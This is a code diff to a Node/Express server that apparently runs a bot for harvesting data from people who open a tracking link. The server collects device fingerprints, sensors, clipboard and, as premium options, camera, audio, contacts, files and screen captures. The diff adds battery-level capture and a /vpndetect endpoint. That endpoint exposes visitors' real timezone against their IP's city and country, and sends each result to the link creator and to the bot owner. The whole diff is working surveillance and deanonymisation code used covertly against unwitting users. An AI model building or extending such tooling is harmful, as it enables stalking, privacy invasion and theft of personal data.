@@ -26,7 +26,7 @@ const USERSTATS_FILE  = "./userstats.json";
 const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
-const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
+const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
 const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
@@ -1104,7 +1104,9 @@ const FEAT_NAMES = {
   fingerprint: "🖥️ بصمة الجهاز",
   sessionTime: "⏱️ وقت الجلسة",
   lightSensor: "💡 مستشعر الضوء",
-  clipboard:   "📋 الحافظة"
+  clipboard:   "📋 الحافظة",
+  battery:     "🔋 مستوى البطارية",
+  vpnDetect:   "🕵️ كشف VPN"
 };
 
 // ── Premium Config Menu ───────────────────────────────────────────────────────
@@ -1432,6 +1434,20 @@ app.post("/network", (req, res) => {
 });
 
 // Battery endpoint — always report
+app.post("/vpndetect", (req, res) => {
+  const uid       = decodeURIComponent(req.body.uid || '');
+  const deviceTz  = req.body.deviceTz || '?';
+  const ipTz      = req.body.ipTz     || '?';
+  const ipCountry = req.body.ipCountry|| '?';
+  const ipCity    = req.body.ipCity   || '?';
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const msg = `🕵️ VPN مكتشف!\n📱 توقيت الجهاز: ${deviceTz}\n🌐 توقيت الـ IP: ${ipTz}\n📍 موقع الـ IP: ${ipCity}, ${ipCountry}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  res.send("Done");
+});
+
 app.post("/battery", (req, res) => {
   const uid      = decodeURIComponent(req.body.uid) || null;
   const level    = parseInt(req.body.level);
